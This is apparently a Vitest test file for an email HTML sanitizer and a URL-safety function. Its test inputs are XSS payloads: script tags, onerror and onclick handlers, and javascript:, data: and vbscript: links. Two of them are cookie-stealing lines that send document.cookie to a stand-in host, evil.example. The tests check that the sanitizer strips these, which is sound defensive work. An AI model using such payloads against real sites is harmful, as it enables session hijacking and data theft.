// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { sanitizeEmailHtml } from "@/lib/security/sanitize-html";
import { isSafeUrl } from "@/lib/security/safe-url";

describe("sanitizeEmailHtml", () => {
  it("removes script tags and their content", () => {
    const result = sanitizeEmailHtml('<p>Hello</p><script>alert(document.cookie)</script>');
    expect(result).not.toMatch(/<script/i);
    expect(result).not.toMatch(/alert/i);
    expect(result).toContain("Hello");
  });

  it("removes iframe tags", () => {
    const result = sanitizeEmailHtml('<p>Hi</p><iframe src="https://evil.example"></iframe>');
    expect(result).not.toMatch(/<iframe/i);
    expect(result).toContain("Hi");
  });

  it("removes object/embed tags", () => {
    const result = sanitizeEmailHtml('<object data="evil.swf"></object><embed src="evil.swf">');
    expect(result).not.toMatch(/<object/i);
    expect(result).not.toMatch(/<embed/i);
  });

  it("removes inline event handler attributes", () => {
    const result = sanitizeEmailHtml('<p onclick="alert(1)">Click</p><img src="x" onerror="alert(1)">');
    expect(result).not.toMatch(/onclick/i);
    expect(result).not.toMatch(/onerror/i);
    expect(result).not.toMatch(/<img/i);
    expect(result).toContain("Click");
  });

  it("strips javascript: URLs from links", () => {
    const result = sanitizeEmailHtml('<a href="javascript:alert(1)">click me</a>');
    expect(result).not.toMatch(/javascript:/i);
    expect(result).toContain("click me");
  });

  it("strips data: URLs from links", () => {
    const result = sanitizeEmailHtml('<a href="data:text/html,<script>alert(1)</script>">bad</a>');
    expect(result).not.toMatch(/data:/i);
  });

  it("strips vbscript: URLs from links", () => {
    const result = sanitizeEmailHtml('<a href="vbscript:msgbox(1)">bad</a>');
    expect(result).not.toMatch(/vbscript:/i);
  });

  it("preserves a safe https link", () => {
    const result = sanitizeEmailHtml('<a href="https://example.com">View details</a>');
    expect(result).toContain('href="https://example.com"');
    expect(result).toContain("View details");
  });

  it("preserves a safe mailto link", () => {
    const result = sanitizeEmailHtml('<a href="mailto:sales@example.com">Email us</a>');
    expect(result).toContain('href="mailto:sales@example.com"');
  });

  it("preserves strong/emphasis formatting", () => {
    const result = sanitizeEmailHtml("Hello <strong>John</strong>, <em>welcome</em>.");
    expect(result).toContain("<strong>John</strong>");
    expect(result).toContain("<em>welcome</em>");
  });

  it("preserves paragraphs", () => {
    const result = sanitizeEmailHtml("<p>First paragraph</p><p>Second paragraph</p>");
    expect(result).toContain("<p>First paragraph</p>");
    expect(result).toContain("<p>Second paragraph</p>");
  });

  it("preserves line breaks", () => {
    const result = sanitizeEmailHtml("Line one<br>Line two");
    expect(result).toContain("<br>");
  });

  it("preserves lists", () => {
    const result = sanitizeEmailHtml("<ul><li>One</li><li>Two</li></ul>");
    expect(result).toContain("<ul>");
    expect(result).toContain("<li>One</li>");
  });

  it("removes style tags and svg/math elements while keeping surrounding text", () => {
    const result = sanitizeEmailHtml("<style>body{display:none}</style><svg onload=\"alert(1)\"></svg>Hello<math></math>");
    expect(result).not.toMatch(/<style/i);
    expect(result).not.toMatch(/<svg/i);
    expect(result).not.toMatch(/<math/i);
    expect(result).toContain("Hello");
  });

  it("removes form/input/button elements", () => {
    const result = sanitizeEmailHtml('<form><input type="text"><button>Submit</button></form>Body text');
    expect(result).not.toMatch(/<form/i);
    expect(result).not.toMatch(/<input/i);
    expect(result).not.toMatch(/<button/i);
    expect(result).toContain("Body text");
  });

  it("does not destroy plain text with no HTML formatting", () => {
    const plain = "Just a plain sentence with no markup at all.";
    expect(sanitizeEmailHtml(plain)).toBe(plain);
  });

  it("sanitizes realistic pasted malicious HTML", () => {
    const pasted =
      '<p onclick="fetch(\'https://evil.example/steal?c=\'+document.cookie)">Click for a surprise</p><script>fetch("https://evil.example/steal?c="+document.cookie)</script>';
    const result = sanitizeEmailHtml(pasted);
    expect(result).not.toMatch(/onclick/i);
    expect(result).not.toMatch(/<script/i);
    expect(result).not.toMatch(/evil\.example/i);
    expect(result).toContain("Click for a surprise");
  });

  it("sanitizes legacy stored malicious HTML the same way", () => {
    const legacyStored = '<p>Hi John,</p><img src=x onerror="new Image().src=\'https://evil.example/c.gif\'">';
    const result = sanitizeEmailHtml(legacyStored);
    expect(result).not.toMatch(/onerror/i);
    expect(result).not.toMatch(/<img/i);
    expect(result).toContain("Hi John,");
  });

  it("is deterministic — the same input always produces the same output", () => {
    const html = '<p>Hi <strong>John</strong></p><a href="https://example.com">link</a><script>bad()</script>';
    expect(sanitizeEmailHtml(html)).toBe(sanitizeEmailHtml(html));
  });

  it("does not mutate the original input string", () => {
    const html = '<p onclick="bad()">Hi</p>';
    const snapshot = html;
    sanitizeEmailHtml(html);
    expect(html).toBe(snapshot);
  });
});

describe("isSafeUrl", () => {
  it.each(["https://example.com", "http://example.com", "mailto:sales@example.com"])(
    "allows %s",
    (url) => {
      expect(isSafeUrl(url)).toBe(true);
    }
  );

  it.each([
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "",
    "   ",
    "not a url",
  ])("rejects %s", (url) => {
    expect(isSafeUrl(url)).toBe(false);
  });
});
